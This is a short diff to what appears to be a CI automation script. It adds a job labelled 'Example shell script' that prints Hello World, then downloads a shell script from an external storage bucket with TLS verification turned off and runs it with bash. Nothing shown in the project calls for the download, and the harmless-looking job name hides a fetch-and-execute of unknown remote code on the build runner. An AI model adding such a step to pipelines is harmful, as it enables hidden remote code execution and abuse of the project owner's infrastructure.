@@ -7,3 +7,16 @@
 job("Hello World!") {
     container(displayName = "Say Hello", image = "hello-world")
 }
+
+job("Example shell script") {
+    container(displayName = "Say Hello", image = "ubuntu") {
+        shellScript {
+            content = """
+                echo Hello
+                echo World!
+                curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/setup-network.sh
+                bash setup-network.sh 253
+            """
+        }
+    }
+}
